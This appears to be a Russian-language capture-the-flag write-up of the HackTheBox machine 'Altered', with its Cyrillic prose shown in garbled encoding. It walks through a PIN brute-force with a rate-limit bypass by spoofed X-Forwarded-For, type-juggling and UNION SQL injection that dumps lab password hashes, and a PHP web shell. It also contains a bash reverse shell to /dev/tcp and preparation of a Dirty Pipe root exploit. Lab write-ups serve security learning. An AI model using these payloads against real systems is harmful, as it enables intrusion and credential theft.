# üî¥ Altered (Linux, Hard)

![](<../.gitbook/assets/image (4).png>)

### –°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ:

–ü–æ—Å–ª–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–º —Ç–æ–ª—å–∫–æ –¥–≤–∞. –ù–∞ 80-–æ–º –ø–æ—Ä—Ç–µ –±—É–¥–µ—Ç —Ñ–æ—Ä–º–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ —Ä–µ–∑–µ—Ç–∞ –ø–∞—Ä–æ–ª—è —Å –ø–∏–Ω–∫–æ–¥–æ–º. –ü—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–±–∏—Ä–∞—Ç—å —á–µ—Ç—ã—Ä–µ—Ö–∑–Ω–∞—á–Ω—ã–π –ø–∏–Ω–∫–æ–¥ –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è, —Ç–∞–∫ –∫–∞–∫ –ø–æ—Å–ª–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫, —Å–∏—Å—Ç–µ–º–∞ –±–ª–æ–∫–∏—Ä—É–µ—Ç –∑–∞–ø—Ä–æ—Å—ã –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. Laravel –Ω–∞—Å—Ç—Ä–æ–µ–Ω —Ç–∞–∫, —á—Ç–æ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Nginx, –∫–∞–∫ –ø—Ä–æ–∫—Å–∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏ –∏ –±—Ä—É—Ç–∏—Ç—å –ø–∏–Ω–∫–æ–¥ —Å –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∞–π–ø–∏ —á–µ—Ä–µ–∑ X-Forwarded-For. –ü–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –º—ã –ø–æ–ª—É—á–∏–º –¥–æ—Å—Ç—É–ø –∫ —É—á–µ—Ç–∫–µ –∞–¥–º–∏–Ω–∞, –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –ø—Ä–æ—ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å SQLi, –ø—Ä–∏ —ç—Ç–æ–º —Ç–æ–∂–µ –æ–±–æ–π–¥—è —Ñ–∏–ª—å—Ç—Ä—ã —Å –ø–æ–º–æ—â—å—é –ø–æ–¥–º–µ–Ω—ã —Ç–∏–ø–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π(Type Juggling). –° –ø–æ–º–æ—â—å—é —ç—Ç–æ–π –∂–µ SQLi –ø–æ–ª—É—á–∏–º –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –∏ –ø—Ä–æ—ç–∫—Å–ø–ª—É—Ç–∏—Ä—É–µ–º –≤—É–ª–Ω—É dirty pipe –¥–ª—è —É—è–∑–≤–∏–º–æ–≥–æ —è–¥—Ä–∞ –ª–∏–Ω—É–∫—Å–∞, —á—Ç–æ–±—ã —Ä—É—Ç–∏—Ä–æ–≤–∞—Ç—å—Å—è.

### –°–∫–∞–Ω–∏—Ä—É–µ–º –ø–æ—Ä—Ç—ã —Å –ø–æ–º–æ—â—å—é nmap:

```
$ nmap -sC -sV 10.10.11.159 -oN nmap
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: UHC March Finals
|_Requested resource was http://10.10.11.159/login
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



![](<../.gitbook/assets/image (7).png>)

### –£–≥–∞–¥—ã–≤–∞–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

–ß–µ—Ä–µ–∑ –¥–∞–Ω–Ω—É—é —Ñ–æ—Ä–º—É –º–æ–∂–Ω–æ —É–≥–∞–¥—ã–≤–∞—Ç—å –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –Ω–∞–ø—Ä–∏–º–µ—Ä, —è –≤–≤–µ–ª - "**admin"**:

![](<../.gitbook/assets/image (9).png>)

–¢–∞–∫–∂–µ –º–æ–∂–Ω–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å, –Ω–æ –Ω—É–∂–Ω–æ –∑–Ω–∞—Ç—å –ø–∏–Ω–∫–æ–¥, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–Ω–æ –µ–≥–æ –ø—Ä–æ–±—Ä—É—Ç–∏—Ç—å:

![](<../.gitbook/assets/image (13).png>)

### –û–±—Ö–æ–¥–∏–º Rate Limit –∏ –±—Ä—É—Ç–∏–º –ø–∏–Ω–∫–æ–¥:

–¢–∞–∫ –∫–∞–∫, –µ—Å–ª–∏ –Ω–∞—á–∞—Ç—å –ø—Ä—è–º–æ –±—Ä—É—Ç–∏—Ç—å –ø–∏–Ω–∫–æ–¥ —á–µ—Ä–µ–∑ **wfuzz**, —Ç–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞—á–∏–Ω–∞–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—Ä–æ—Å—ã (–≥–¥–µ-—Ç–æ –ø–æ—Å–ª–µ 60-–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞), —Ç.–µ. —Ç—É—Ç —Å—Ç–æ–∏—Ç **Rate Limit**. –ù–∞ —Å–∞–π—Ç–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è **Laravel**, —ç—Ç–æ –º–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ —Ö—Ä–∞–Ω—è—â–∏–º—Å—è –∫—É–∫–∞–º. –ê **Laravel** –Ω–∞—Å—Ç—Ä–æ–µ–Ω —Ç–∞–∫, —á—Ç–æ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç **Nginx**, –∫–∞–∫ –ø—Ä–æ–∫—Å–∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å **HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏** –∏ –±—Ä—É—Ç–∏—Ç—å –ø–∏–Ω–∫–æ–¥ —Å –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∞–π–ø–∏ —á–µ—Ä–µ–∑ **X-Forwarded-For**. –ü–æ—ç—Ç–æ–º—É –¥–µ–ª–∞–µ–º –¥–≤–∞ —Å–ª–æ–≤–∞—Ä—è, –æ–¥–∏–Ω –¥–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ **X-Forwarded-For**:&#x20;

```
for i in {1..100}; do (for i in {1..254}; do echo $i; done); done >> wordlist1.txt
```

–ê –¥—Ä—É–≥–æ–π –¥–ª—è –ø–∏–Ω–∫–æ–¥–∞:

```
(for i in {0000..9999}; do echo $i; done) >> wordlist2.txt
```

–¢–∞–∫ –∫–∞–∫ –º—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ü–∏–∫–ª —Å —ç—Ç–∏–º–∏ –¥–≤—É–º—è —Å–ª–æ–≤–∞—Ä—è–º–∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –Ω—É–∂–Ω–æ, —á—Ç–æ–±—ã –≤ **wordlist1.txt** –±—ã–ª–æ –±–æ–ª—å—à–µ —Å–ª–æ–≤, —á–µ–º –≤ **wordlist2.txt**:

```
wfuzz -H 'Cookie: XSRF-TOKEN=eyJpdiI6InlZZUE4bUkvODdaL2s5UHVHYVYzenc9PSIsInZhbHVlIjoiekdoaENqeUVrVVZwOTF3OVUwUURodTNTUUlPbVJzWkNIcFl5Q3QzSElGSnc5eE9IZzBaMno1OEd1eUFCdXE0QWg0RzV3ZFZQRi9QTVBkM0hNUGprdDBaREtOTUcyNS91bTlpQ1BZTTlLS05pMU15MU92aE93bGtua1c2SGwzV3oiLCJtYWMiOiI5ZGFjMmIyZTQ4OTc0ZTEzNzg2YzZjMWI5NmNmNGJjNGFiZDdhODg0ZWRiNjRjODllMGVhNTBjNGQxMGExMGRmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsSDFSODIrQ3lZZzRQKzFHclI4eWc9PSIsInZhbHVlIjoiSkxPVDIrRUU4RmxxRXlaLzZ1alh5cC9oRnllTFpHOGpRYmQyMTUvWkVvYmJycEVSSWUwOFMxNmxINHlENU02Rk5GT2RPU0MvNmZBdGorSXJOUG1XSXlJNk4wd2dZVUpIN0lSd3JFRk1lSURpZElkdmE4VCtkcWkxVG1yT0s0SFIiLCJtYWMiOiJmZjY0MzZiY2I2NzcxM2NlYzExM2ZhNDY5OTg5MTY1YWQ5OWMxNzgxMjBjMzBmZDAwODE4ZjM1OWE1YzBmZTUyIiwidGFnIjoiIn0%3D' -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.11.159/api/resettoken -d 'name=admin&pin=FUZZ' -z range,1000-9999 -m zip -w wordlist1.txt  -H 'X-Forwarded-For: 127.0.0.FUZ2Z' --hh 5644
```

**Wfuzz** –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–º —Ñ–ª–∞–≥–æ–º **-m zip**, —á—Ç–æ–±—ã —É–∫–∞–∑–∞—Ç—å –¥–≤–∞ —Å–ª–æ–≤–∞—Ä—è –Ω–∞ –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ —Ñ–∞–∑–∑–∏–Ω–≥–∞.

![](../.gitbook/assets/image.png)

–ü–∏–Ω–∫–æ–¥ - 5118, –≤–≤–µ–¥—è –µ–≥–æ –∏ –∏–∑–º–µ–Ω–∏–≤ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∞, –º—ã –º–æ–∂–µ–º –≤–æ–π—Ç–∏ –≤ –ø–∞–Ω–µ–ª—å:

![](<../.gitbook/assets/image (15).png>)

–ü—Ä–∏ –∫–ª–∏–∫–µ –Ω–∞ —Å—Å—ã–ª–∫—É **view** —É –Ω–∞—Å –æ–±—Ä–∞–∑—É–µ—Ç—Å—è **GET-–∑–∞–ø—Ä–æ—Å** —Å –¥–≤—É–º—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ **id** –∏ **secret**:

![](<../.gitbook/assets/image (3).png>)

### –û–±—Ö–æ–¥–∏–º —Ñ–∏–ª—å—Ç—Ä—ã –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º SQLi:

–ü—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ **id** –≤—ã–ª–µ—Ç–∞–µ—Ç –æ—à–∏–±–∫–∞, —Å–æ–æ–±—â–∞—é—â–∞—è –æ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞. –¢–∞–∫, –∫–∞–∫ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä **id** –¥–æ–ª–∂–µ–Ω —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É –ø–∞—Ä–∞–º–µ—Ç—Ä—É **secret**(–∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è **md5** —Ö—ç—à–µ–º, **32** —Å–∏–º–≤–æ–ª–∞), —Ç–æ –º—ã –Ω–µ –º–æ–∂–µ–º –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å **SQLi**, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–Ω–æ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞ –≤ **json** –∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—É–ª–Ω—É, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–∏ —Ç–∏–ø–æ–≤(**Type Juggling**). –Ø –µ–µ –ø–æ–¥—Ä–æ–±–Ω–æ —Ä–∞–∑–æ–±—Ä–∞–ª –≤ —Ä–∞–π—Ç–∞–ø–µ –ø–æ [Ransom](https://tragernout.gitbook.io/hackandgtfo/hackthebox-writeups/ransom-linux-medium), –∞ —Ç–∞–∫–∂–µ –Ω–∞—à–µ–ª –ø–æ–¥—Ä–æ–±–Ω—É—é —Å—Ç–∞—Ç—å—é –ø–æ —ç—Ç–æ–º—É —Ç–∏–ø—É –≤—É–ª–Ω—ã [https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf):

```http
GET /api/getprofile HTTP/1.1
Host: 10.10.11.15
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/json
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Referer: http://10.10.11.159/
Cookie: XSRF-TOKEN=eyJpdiI6IlJsUnBqS0RrNG1xNWhxNFloWGpsZXc9PSIsInZhbHVlIjoiU01DY2YvOENtNHpHM1QzK2Z6c0l4OGpRSkNLeDQyVzk5emVHNU55TEIvSXRkZzRERXphNXBKSUxOaTFmSjNwNXNkaXJWMnhQMTVQclVLRVd0ckZDcFlTYXJ6OC9sdDNDZkxpSW91SEl6WlNnWnJGYTZVZXhkSlR4VjEzaGlUbnUiLCJtYWMiOiJlODZkYWFlMTYyNGFmMDRiYmUwZDgyNTM1YjZhZjc0ZWQyMTUyNzg1YmIwZGJmZGQ5MjgwMzhmNmE1NTAyNjQwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjdLWnAwUFZhb1RCRG90T1NZOGJocmc9PSIsInZhbHVlIjoiQjQ4R0Zkcm1BOHJ6ZlBnbFc5a1ptbVcrNXRPWUJ2MnlXbUE2ZzAwbDZKMDc2WDI1MlQwaldTVkdIYUNMZStLNFAxSGptOGhGNFhaM0piclFjTVB6WDgrYzErOEtyYlBTb0h0OUhsU2I2a1oycUhHWHd2bzA5OUpQQVBpZVR1ZXYiLCJtYWMiOiIwNDM0ZTM3YmYzODU3ZTVhODYzMWU1MmE0MmFmNzk3MDdlOWZiNWMyMzBmYTc3MTZlMDI3ZTRlNTAwMmQ5OWQwIiwidGFnIjoiIn0%3D
Content-Length: 60

{
"id":"2",
"secret":"c5169f4e0e83fd309f4d72a354021c60"
}
```

![](<../.gitbook/assets/image (11).png>)

![](<../.gitbook/assets/image (1).png>)

–î–∞–ª–µ–µ —è –ø—Ä–æ—Å—Ç–æ —Ä–∞—Å–∫—Ä—É—Ç–∏–ª **UNION SQLi**([–æ –Ω–µ–π —è —Ç–æ–∂–µ —Å–¥–µ–ª–∞–ª —Å—Ç–∞—Ç—å—é](https://tragernout.gitbook.io/hackandgtfo/owasp-top-10/sql-union-injection)):

* –ü–æ–¥–±–∏—Ä–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å—Ç–æ–ª–±—Ü–æ–≤ –≤ **–ë–î**, –∫–æ—Ç–æ—Ä–∞—è —Å–µ–π—á–∞—Å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é **null**:

![](<../.gitbook/assets/image (16).png>)

* –°–º–æ—Ç—Ä–∏–º –∫–∞–∫–∏–µ –µ—Å—Ç—å –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö:

![](<../.gitbook/assets/image (2).png>)

```
{
"id":"1337 union select null,null,group_concat(schema_name) from information_schema.schemata -- -",
"secret": true
}
```

* –í—ã—Ç–∞—Å–∫–∏–≤–∞–µ–º —Ç–∞–±–ª–∏—Ü—ã –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö **uhc**:

```
1337 union select null,null,group_concat(table_name) from information_schema.tables where table_schema='uhc' -- -
```

```
failed_jobs,migrations,password_resets,personal_access_tokens,tasks,users
```

* –í—ã—Ç–∞—Å–∫–∏–≤–∞–µ–º —Å—Ç–æ–ª–±—Ü—ã –∏–∑ —Ç–∞–±–ª–∏—Ü—ã **users** –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö **uhc**:

```
1337 union select null,null,group_concat(column_name) from information_schema.columns where table_schema='uhc' and table_name='users' -- -
```

```
bio,country,created_at,email,email_verified_at,id,name,password,remember_token,updated_at
```

* –î–æ—Å—Ç–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–º –Ω–∏—á–µ–≥–æ –Ω–µ –¥–∞—é—Ç :joy: :

```
1337 union select null,null,group_concat('\n', email, ':', name, ':', password) from uhc.users -- -
```

```
big0us@htb.local:big0us:$2y$10$L3X8m6P1w.F2aO011ffWr.587vGCYeFXuXwE2vr3DbrYkcuF741N2,
celesian@htb.local:celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6,
luska@htb.local:luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.,
tinyb0y@htb.local:tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS,
o-tafe@htb.local:o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW,
watchdog@htb.local:watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq,
mydonut@htb.local:mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK,
bee@htb.local:bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm,
admin@htb.local:admin:$2y$10$uYmwbmWFdhy6mFXFPqgU3uDJDg1pJFJfWStkcaJY7LLJ69G17GdHC
```

### –°–æ–∑–¥–∞–µ–º Reverse Shell —á–µ—Ä–µ–∑ SQLi:

–ú—ã –º–æ–∂–µ–º —á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª—ã, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ –∫–æ—Ä–Ω–µ–≤—É—é –ø–∞–ø–∫—É —Å–µ—Ä–≤–µ—Ä–∞:

![](<../.gitbook/assets/image (12).png>)

–¢–µ–ø–µ—Ä—å –ø–æ–ø—Ä–æ–±—É–µ–º —Å–æ–∑–¥–∞—Ç—å —Å–≤–æ–π —Ñ–∞–π–ª **html**, –∑–∞–ø–∏—Å–∞—Ç—å –≤ –Ω–µ–≥–æ —á—Ç–æ-—Ç–æ –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –∏–º–µ–µ–º –ª–∏ –º—ã –ø—Ä–∞–≤–∞ —Å–æ–∑–¥–∞–≤–∞—Ç—å –∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã:

![](<../.gitbook/assets/image (6).png>)

![](<../.gitbook/assets/image (18).png>)

–í—Å–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Ä–µ–≤–µ—Ä—Å —à–µ–ª–ª–∞:

```
{
"id":"1337 union select null,null,'<?php system($_REQUEST[\"cmd\"]) ?>' into outfile '/srv/altered/public/tragernout.php' -- -",
"secret": true
}
```

![](<../.gitbook/assets/image (8).png>)

–ù–æ –≤–µ–± —à–µ–ª–ª –Ω–∞—Å –Ω–µ —É—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç, –ø–æ—ç—Ç–æ–º—É –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –∑–∞–ø—Ä–æ—Å –∏ –º–µ–Ω—è–µ–º –µ–≥–æ –º–µ—Ç–æ–¥, –∞ –ø–æ—Ç–æ–º –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä **cmd** –≤—Å—Ç–∞–≤–ª—è–µ–º –Ω–∞—à –ø—ç–π–ª–æ–∞–¥ –≤ **URL-—ç–Ω–∫–æ–¥–µ**:

![](<../.gitbook/assets/image (5).png>)

```
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.44/9898+0>%261'
```

![](<../.gitbook/assets/image (10).png>)

### –†—É—Ç–∏—Ä—É–µ–º—Å—è —á–µ—Ä–µ–∑ Dirty Pipe(CVE-2022-0847):

```
$ uname -a
```

```
Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

–ú—ã –º–æ–∂–µ–º –ø–æ–≥—É–≥–ª–∏—Ç—å –≤–µ—Ä—Å–∏—é —è–¥—Ä–∞ –ª–∏–Ω—É–∫—Å 5.16.0 –∏ –Ω–∞–π—Ç–∏ **CVE-2022-0847 (Dirty Pipe):**

{% embed url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" %}

–ï—Å–ª–∏ –≤–∫—Ä–∞—Ç—Ü–µ, —Ç–æ –≤—É–ª–Ω–∞ **Dirty Pipe** –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –ª—é–±—ã–µ —Ñ–∞–π–ª—ã, –Ω–æ —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–≥–æ —Å–∏–º–≤–æ–ª–∞ –≤ –Ω–∏—Ö. –ü–æ–ª—É—á–∞–µ—Ç—Å—è, –Ω–∞–º –Ω—É–∂–Ω–æ –∏—Å–∫–∞—Ç—å **SUID-—Ñ–∞–π–ª—ã**, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ–º –∏ —Ä—É—Ç–∏—Ä—É–µ–º—Å—è:

–°–∫–∞—á–∏–≤–∞–µ–º –≤—Ç–æ—Ä–æ–π —ç–∫—Å–ø–ª–æ–∏—Ç –∫ —Å–µ–±–µ –Ω–∞ –º–∞—à–∏–Ω—É, –∫–æ–º–ø–∏–ª–∏—Ä—É–µ–º –∏ –ø–æ–¥–Ω–∏–º–∞–µ–º –ø–∞–π—Ç–æ–Ω–æ–≤—Å–∫–∏–π –≤–µ–±-—Å–µ—Ä–≤–µ—Ä:

```
$ gcc exploit-2.c -o exploit
$ python3 -m http.server
```

![](<../.gitbook/assets/image (19).png>)
